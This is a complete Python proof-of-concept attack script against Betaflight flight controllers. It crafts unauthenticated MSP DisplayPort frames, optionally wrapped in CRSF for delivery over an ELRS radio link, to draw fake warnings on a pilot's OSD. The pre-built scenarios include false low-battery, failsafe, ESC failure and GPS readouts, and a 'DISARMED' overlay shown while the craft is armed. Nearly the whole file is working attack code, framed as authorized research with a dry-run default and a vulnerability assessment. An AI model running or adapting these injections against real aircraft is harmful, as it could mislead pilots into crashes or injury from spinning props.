#!/usr/bin/env python3
"""
MSP DisplayPort OSD Injection PoC — inject fake warnings into the pilot's OSD

Demonstrates that Betaflight's MSP DisplayPort (canvas-mode OSD) accepts
draw commands over the same MSP transport as any other command, with NO
authentication, NO integrity check beyond the MSP XOR checksum, and NO
origin validation. An attacker who can inject MSP frames (via ELRS
MSP-over-CRSF, serial UART, or USB) can draw arbitrary text on the
pilot's OSD, including fake safety-critical warnings.

Attack surface:
  MSP DisplayPort uses three sub-commands within MSP_DISPLAYPORT (0xB6/182):
    - Sub 3: write_string(row, col, attr, string)
    - Sub 4: draw_screen (flush buffer to display)
    - Sub 1: clear_screen

  These commands are accepted regardless of arming state, flight mode, or
  whether the FC originated the prior OSD frame. The protocol has no
  sequence numbers, no HMAC, and no way for the OSD hardware to distinguish
  legitimate FC draw commands from injected ones.

Impact scenarios:
  - Fake "LOW BATTERY" → pilot lands prematurely or panics
  - Fake "FAILSAFE" → pilot believes link is lost
  - Fake "GPS RESCUE" → pilot confused about flight mode
  - Persistent overlay → obscures real telemetry (altitude, RSSI, etc.)
  - Fake "DISARMED" → pilot believes craft is safe when armed

Transport modes:
  - SITL TCP:    Direct MSP-over-TCP to Betaflight SITL
  - Serial:      MSP-over-UART (requires pyserial)
  - Dry-run:     Construct and display frames without sending

Usage:
  # Dry-run: show the crafted MSP frames
  python3 msp-displayport-inject.py --scenario low-battery

  # Inject into SITL
  python3 msp-displayport-inject.py --target tcp:127.0.0.1:5760 \\
      --scenario failsafe --execute

  # Custom message injection
  python3 msp-displayport-inject.py --target tcp:127.0.0.1:5760 \\
      --text "HACKED" --row 7 --col 14 --attr 2 --execute

  # All scenarios in sequence
  python3 msp-displayport-inject.py --scenario all --execute \\
      --target tcp:127.0.0.1:5760

For authorized security research and CTF use only.
"""

import argparse
import os
import socket
import struct
import sys
import time
from typing import Optional

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)

# ---------------------------------------------------------------------------
# MSP v1 protocol
# ---------------------------------------------------------------------------

MSP_HEADER = b"$M"
MSP_DIR_TO_FC = b"<"
MSP_DIR_FROM_FC = b">"

MSP_DISPLAYPORT = 182  # 0xB6


def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    body = bytes([len(payload), cmd]) + payload
    return MSP_HEADER + MSP_DIR_TO_FC + body + bytes([msp_checksum(body)])


# ---------------------------------------------------------------------------
# MSP DisplayPort sub-commands
# ---------------------------------------------------------------------------

# DisplayPort sub-command IDs (from Betaflight src/main/io/displayport_msp.c)
SUBCMD_RELEASE = 0
SUBCMD_CLEAR = 1
SUBCMD_WRITE_STRING = 3
SUBCMD_DRAW_SCREEN = 4
SUBCMD_SET_OPTIONS = 5

# OSD character attributes
ATTR_NORMAL = 0
ATTR_INFO = 0
ATTR_WARNING = 1    # typically yellow
ATTR_CRITICAL = 2   # typically red/flashing
ATTR_BLINK = 2


def displayport_clear() -> bytes:
    """MSP_DISPLAYPORT sub-command 1: clear the OSD screen."""
    payload = bytes([SUBCMD_CLEAR])
    return build_msp_command(MSP_DISPLAYPORT, payload)


def displayport_write_string(row: int, col: int, attr: int, text: str) -> bytes:
    """MSP_DISPLAYPORT sub-command 3: write a string at (row, col)."""
    text_bytes = text.encode("ascii", errors="replace")
    payload = bytes([SUBCMD_WRITE_STRING, row, col, attr]) + text_bytes
    return build_msp_command(MSP_DISPLAYPORT, payload)


def displayport_draw_screen() -> bytes:
    """MSP_DISPLAYPORT sub-command 4: flush buffer to display."""
    payload = bytes([SUBCMD_DRAW_SCREEN])
    return build_msp_command(MSP_DISPLAYPORT, payload)


def displayport_release() -> bytes:
    """MSP_DISPLAYPORT sub-command 0: release display."""
    payload = bytes([SUBCMD_RELEASE])
    return build_msp_command(MSP_DISPLAYPORT, payload)


# ---------------------------------------------------------------------------
# OSD grid constants (HD / SD)
# ---------------------------------------------------------------------------

# Standard Betaflight OSD grid sizes
OSD_SD_COLS = 30
OSD_SD_ROWS = 16
OSD_HD_COLS = 50  # Walksnail/DJI/HDZero HD canvas
OSD_HD_ROWS = 18


def center_col(text: str, cols: int = OSD_SD_COLS) -> int:
    return max(0, (cols - len(text)) // 2)


# ---------------------------------------------------------------------------
# Attack scenarios
# ---------------------------------------------------------------------------

SCENARIOS = {
    "low-battery": {
        "name": "Fake Low Battery Warning",
        "description": (
            "Injects a critical low-battery warning. The pilot sees what "
            "appears to be a genuine Betaflight battery alert, potentially "
            "causing premature landing or panic."
        ),
        "messages": [
            {"row": 5, "col": None, "attr": ATTR_CRITICAL, "text": "! LOW BATTERY !"},
            {"row": 6, "col": None, "attr": ATTR_CRITICAL, "text": "VOLTAGE: 2.8V/CELL"},
            {"row": 7, "col": None, "attr": ATTR_WARNING, "text": "LAND IMMEDIATELY"},
        ],
    },
    "failsafe": {
        "name": "Fake Failsafe Warning",
        "description": (
            "Injects a failsafe indicator. The pilot believes the radio "
            "link is lost, which may trigger GPS rescue or manual panic."
        ),
        "messages": [
            {"row": 5, "col": None, "attr": ATTR_CRITICAL, "text": "! FAILSAFE !"},
            {"row": 6, "col": None, "attr": ATTR_CRITICAL, "text": "SIGNAL LOST"},
            {"row": 7, "col": None, "attr": ATTR_WARNING, "text": "GPS RESCUE ACTIVE"},
        ],
    },
    "gps-spoof": {
        "name": "Fake GPS Status",
        "description": (
            "Injects false GPS coordinates and satellite count, misleading "
            "the pilot about aircraft position."
        ),
        "messages": [
            {"row": 1, "col": 0, "attr": ATTR_NORMAL, "text": "SAT:14 HDOP:0.8"},
            {"row": 14, "col": 0, "attr": ATTR_NORMAL, "text": "40.7128N 74.0060W"},
            {"row": 14, "col": 20, "attr": ATTR_NORMAL, "text": "ALT: 120m"},
        ],
    },
    "disarmed-spoof": {
        "name": "Fake Disarmed Status",
        "description": (
            "Overlays a 'DISARMED' indicator while the craft is actually "
            "armed. The pilot may approach the aircraft believing it is "
            "safe, risking injury from spinning props."
        ),
        "messages": [
            {"row": 8, "col": None, "attr": ATTR_NORMAL, "text": "DISARMED"},
        ],
    },
    "telemetry-overlay": {
        "name": "Persistent Telemetry Overlay",
        "description": (
            "Covers real OSD telemetry with fake values, obscuring "
            "actual RSSI, battery voltage, altitude, and flight mode. "
            "The pilot flies on false data."
        ),
        "messages": [
            {"row": 0, "col": 0, "attr": ATTR_NORMAL, "text": "RSSI: 99  LQ:100"},
            {"row": 0, "col": 18, "attr": ATTR_NORMAL, "text": "16.8V 0.0A"},
            {"row": 15, "col": 0, "attr": ATTR_NORMAL, "text": "ACRO  ALT:50m  SPD:0"},
            {"row": 15, "col": 22, "attr": ATTR_NORMAL, "text": "00:00"},
        ],
    },
    "motor-warning": {
        "name": "Fake Motor/ESC Error",
        "description": (
            "Injects a fake ESC/motor failure warning, potentially "
            "causing the pilot to land or panic about hardware failure."
        ),
        "messages": [
            {"row": 6, "col": None, "attr": ATTR_CRITICAL, "text": "! ESC ERROR !"},
            {"row": 7, "col": None, "attr": ATTR_CRITICAL, "text": "MOTOR 3 FAILURE"},
            {"row": 8, "col": None, "attr": ATTR_WARNING, "text": "LAND NOW"},
        ],
    },
}


def build_scenario_frames(scenario_key: str) -> list[tuple[str, bytes]]:
    """Build the MSP frame sequence for a named attack scenario."""
    scenario = SCENARIOS[scenario_key]
    frames = []

    # Clear screen first
    frames.append(("CLEAR_SCREEN", displayport_clear()))

    # Write each message
    for msg in scenario["messages"]:
        col = msg["col"]
        if col is None:
            col = center_col(msg["text"])
        desc = f"WRITE({msg['row']},{col},attr={msg['attr']}): \"{msg['text']}\""
        frame = displayport_write_string(msg["row"], col, msg["attr"], msg["text"])
        frames.append((desc, frame))

    # Flush to display
    frames.append(("DRAW_SCREEN", displayport_draw_screen()))

    return frames


def build_custom_frame(row: int, col: int, attr: int, text: str) -> list[tuple[str, bytes]]:
    """Build MSP frames for a custom text injection."""
    frames = [
        ("CLEAR_SCREEN", displayport_clear()),
        (f"WRITE({row},{col},attr={attr}): \"{text}\"",
         displayport_write_string(row, col, attr, text)),
        ("DRAW_SCREEN", displayport_draw_screen()),
    ]
    return frames


# ---------------------------------------------------------------------------
# Transport layer
# ---------------------------------------------------------------------------

class MspTransport:
    def __init__(self, target: Optional[str] = None):
        self.target = target
        self.sock = None
        self.serial_port = None

    def connect(self):
        if not self.target:
            return
        if self.target.startswith("tcp:"):
            _, hostport = self.target.split(":", 1)
            host, port = hostport.rsplit(":", 1)
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5.0)
            self.sock.connect((host, int(port)))
        elif self.target.startswith("serial:") or self.target.startswith("/dev/") or self.target.startswith("COM"):
            port = self.target.replace("serial:", "", 1) if self.target.startswith("serial:") else self.target
            import serial
            self.serial_port = serial.Serial(port, 115200, timeout=1)

    def send(self, data: bytes):
        if self.sock:
            self.sock.sendall(data)
        elif self.serial_port:
            self.serial_port.write(data)

    def recv(self, size: int = 256) -> bytes:
        if self.sock:
            try:
                return self.sock.recv(size)
            except socket.timeout:
                return b""
        elif self.serial_port:
            return self.serial_port.read(size)
        return b""

    def close(self):
        if self.sock:
            self.sock.close()
        if self.serial_port:
            self.serial_port.close()


# ---------------------------------------------------------------------------
# Frame analysis (for dry-run)
# ---------------------------------------------------------------------------

def hex_dump(data: bytes) -> str:
    return " ".join(f"{b:02x}" for b in data)


def analyze_frame(desc: str, frame: bytes, index: int):
    """Pretty-print a frame for dry-run analysis."""
    print(f"  Frame {index}: {desc}")
    print(f"    Hex:  {hex_dump(frame)}")
    print(f"    Len:  {len(frame)} bytes")

    # Parse MSP structure
    if len(frame) >= 5 and frame[:2] == b"$M":
        direction = "TO_FC" if frame[2:3] == b"<" else "FROM_FC"
        payload_len = frame[3]
        cmd = frame[4]
        payload = frame[5:5 + payload_len]
        checksum = frame[5 + payload_len] if len(frame) > 5 + payload_len else None

        print(f"    MSP:  dir={direction} cmd={cmd} (0x{cmd:02x}) "
              f"payload_len={payload_len}")
        if payload:
            print(f"    Data: {hex_dump(payload)}")
        if checksum is not None:
            expected = msp_checksum(bytes([payload_len, cmd]) + payload)
            valid = "OK" if checksum == expected else "INVALID"
            print(f"    CRC:  0x{checksum:02x} ({valid})")
    print()


# ---------------------------------------------------------------------------
# CRSF encapsulation (for OTA delivery analysis)
# ---------------------------------------------------------------------------

def _build_crc8_table(poly: int) -> list[int]:
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = ((crc << 1) ^ poly) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
        table.append(crc)
    return table

CRC8_D5 = _build_crc8_table(0xD5)


def crsf_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = CRC8_D5[crc ^ b]
    return crc


CRSF_FRAMETYPE_MSP_REQ = 0x7A   # MSP request wrapped in CRSF
CRSF_ADDRESS_FC = 0xC8          # Flight controller
CRSF_ADDRESS_TX = 0xEA          # TX module (radio)


def wrap_msp_in_crsf(msp_payload: bytes) -> bytes:
    """Wrap an MSP command payload in a CRSF MSP_REQ frame.

    This shows how the injection would travel over the ELRS radio link:
    CRSF frame type 0x7A carries MSP requests from TX to FC.
    """
    # CRSF MSP frame: [dest] [origin] [msp_payload...]
    inner = bytes([CRSF_ADDRESS_FC, CRSF_ADDRESS_TX]) + msp_payload

    # CRSF frame: [sync] [len] [type] [inner...] [crc]
    frame_type = CRSF_FRAMETYPE_MSP_REQ
    frame_len = len(inner) + 2  # type + inner + crc
    crc_data = bytes([frame_type]) + inner
    crc = crsf_crc8(crc_data)

    return bytes([CRSF_ADDRESS_FC, frame_len, frame_type]) + inner + bytes([crc])


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="MSP DisplayPort OSD Injection PoC"
    )
    parser.add_argument(
        "--target",
        help="Target MSP endpoint: tcp:host:port or serial:/dev/ttyX or COMn",
    )
    parser.add_argument(
        "--scenario",
        choices=list(SCENARIOS.keys()) + ["all"],
        help="Pre-built attack scenario",
    )
    parser.add_argument(
        "--text",
        help="Custom text to inject",
    )
    parser.add_argument(
        "--row", type=int, default=7,
        help="OSD row for custom text (default: 7)",
    )
    parser.add_argument(
        "--col", type=int, default=None,
        help="OSD column for custom text (default: centered)",
    )
    parser.add_argument(
        "--attr", type=int, default=ATTR_CRITICAL, choices=[0, 1, 2],
        help="Character attribute: 0=normal 1=warning 2=critical (default: 2)",
    )
    parser.add_argument(
        "--repeat", type=int, default=1,
        help="Repeat injection N times with delay (for persistence)",
    )
    parser.add_argument(
        "--delay", type=float, default=0.1,
        help="Delay between repeated injections in seconds",
    )
    parser.add_argument(
        "--execute", action="store_true",
        help="Actually send frames (default is dry-run analysis)",
    )
    parser.add_argument(
        "--show-crsf", action="store_true",
        help="Also show CRSF-wrapped frames (OTA delivery format)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file with frame data",
    )
    args = parser.parse_args()

    if not args.scenario and not args.text:
        parser.error("Specify --scenario or --text")

    print("MSP DisplayPort OSD Injection PoC")
    print(f"Mode: {'EXECUTE' if args.execute else 'DRY-RUN (analysis only)'}")
    if args.target:
        print(f"Target: {args.target}")
    print()

    # Build frame sequences
    all_sequences = []

    if args.scenario == "all":
        for key in SCENARIOS:
            all_sequences.append((key, SCENARIOS[key], build_scenario_frames(key)))
    elif args.scenario:
        key = args.scenario
        all_sequences.append((key, SCENARIOS[key], build_scenario_frames(key)))

    if args.text:
        col = args.col if args.col is not None else center_col(args.text)
        frames = build_custom_frame(args.row, col, args.attr, args.text)
        custom_info = {
            "name": "Custom Injection",
            "description": f"Custom text: \"{args.text}\" at ({args.row},{col})",
        }
        all_sequences.append(("custom", custom_info, frames))

    # Output collection
    output_data = {"scenarios": [], "execute": args.execute}

    for seq_key, seq_info, frames in all_sequences:
        print(f"{'=' * 60}")
        print(f"Scenario: {seq_info['name']}")
        print(f"{'=' * 60}")
        print(f"Description: {seq_info['description']}")
        print(f"Frames: {len(frames)}")
        print()

        scenario_output = {
            "key": seq_key,
            "name": seq_info["name"],
            "frames": [],
        }

        for i, (desc, frame) in enumerate(frames):
            analyze_frame(desc, frame, i + 1)

            frame_entry = {
                "description": desc,
                "hex": hex_dump(frame),
                "bytes": list(frame),
                "length": len(frame),
            }

            if args.show_crsf:
                # Extract MSP payload (skip $M< header, include len+cmd+payload)
                msp_payload = frame[3:-1]  # len, cmd, payload (no checksum in CRSF wrap)
                crsf_frame = wrap_msp_in_crsf(msp_payload)
                print(f"    CRSF-wrapped (OTA): {hex_dump(crsf_frame)}")
                print(f"    CRSF length: {len(crsf_frame)} bytes")
                print()
                frame_entry["crsf_hex"] = hex_dump(crsf_frame)
                frame_entry["crsf_bytes"] = list(crsf_frame)

            scenario_output["frames"].append(frame_entry)

        output_data["scenarios"].append(scenario_output)

    # Execute if requested
    if args.execute:
        if not args.target:
            print("ERROR: --execute requires --target")
            return 1

        transport = MspTransport(args.target)
        try:
            print(f"\nConnecting to {args.target}...")
            transport.connect()
            print("Connected.\n")

            for rep in range(args.repeat):
                if args.repeat > 1:
                    print(f"--- Injection round {rep + 1}/{args.repeat} ---")

                for seq_key, seq_info, frames in all_sequences:
                    print(f"Injecting: {seq_info['name']}")
                    for desc, frame in frames:
                        transport.send(frame)
                        print(f"  Sent: {desc}")
                        # Brief pause between frames
                        time.sleep(0.02)

                    # Read any response
                    resp = transport.recv(256)
                    if resp:
                        print(f"  Response: {hex_dump(resp)}")

                if rep < args.repeat - 1:
                    time.sleep(args.delay)

            print("\nInjection complete.")

        except Exception as e:
            print(f"ERROR: {e}")
            return 1
        finally:
            transport.close()
    else:
        print(f"\n{'=' * 60}")
        print("DRY-RUN COMPLETE — no frames were sent.")
        print(f"{'=' * 60}")
        print("\nTo execute against SITL: add --execute --target tcp:host:port")
        print("To see CRSF OTA format: add --show-crsf")

    # Assessment
    print(f"\n{'=' * 60}")
    print("VULNERABILITY ASSESSMENT")
    print(f"{'=' * 60}")
    print("  Protocol:    MSP DisplayPort (0xB6)")
    print("  Auth:        NONE — no authentication on draw commands")
    print("  Integrity:   XOR checksum only (trivially forged)")
    print("  Arming gate: NONE — accepted in all flight states")
    print("  Origin check: NONE — FC cannot distinguish source")
    print("  OTA path:    MSP-over-CRSF (type 0x7A) → ELRS → FC")
    print()
    print("  Impact: An attacker on the MSP bus (via ELRS OTA injection,")
    print("  UART access, or USB) can display arbitrary text on the")
    print("  pilot's OSD, including fake safety warnings that may cause")
    print("  the pilot to take dangerous corrective action.")

    if args.output:
        import json
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        print(f"\nFrame data written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
